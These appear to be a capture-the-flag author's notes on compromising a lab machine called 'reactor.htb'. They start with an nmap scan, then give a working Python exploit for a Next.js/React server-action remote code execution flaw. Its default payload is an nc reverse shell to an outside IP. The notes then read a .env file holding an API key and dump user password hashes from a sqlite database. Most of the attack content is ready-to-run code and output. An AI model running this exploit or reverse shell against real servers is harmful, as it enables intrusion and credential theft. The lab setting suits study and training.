```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sun, 24 May 2026 00:09:01 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 24 May 2026 00:09:02 GMT
|     Connection: close
|   Help, NCP, RPCCheck:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 24 May 2026 00:09:03 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=5/24%Time=6A12419D%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Route
SF:r-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,
SF:\x20Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x2
SF:01\r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r
SF:\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\
SF:"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:017175\r\nDate:\x20Sun,\x2024\x20May\x202026\x2000:09:01\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><m
SF:eta\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width
SF:=device-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20hre
SF:f=\"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next
SF:\"/><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\
SF:x20href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\
SF:x20src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=
SF:\"\"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead
SF:1\.js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOp
SF:tions,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-
SF:Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Pref
SF:etch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x
SF:20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20S
SF:un,\x2024\x20May\x202026\x2000:09:02\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x
SF:20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Rout
SF:er-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control
SF::\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidat
SF:e\r\nDate:\x20Sun,\x2024\x20May\x202026\x2000:09:03\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://reactor.htb:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.186 4444 >/tmp/f"
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
```

form this i get rce of cve react2shell

```
node@reactor:/opt/reactor-app$ ls -la
total 76
drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   276 Dec 28 21:05 .env
drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
node@reactor:/opt/reactor-app$ cat .env
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

```
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```
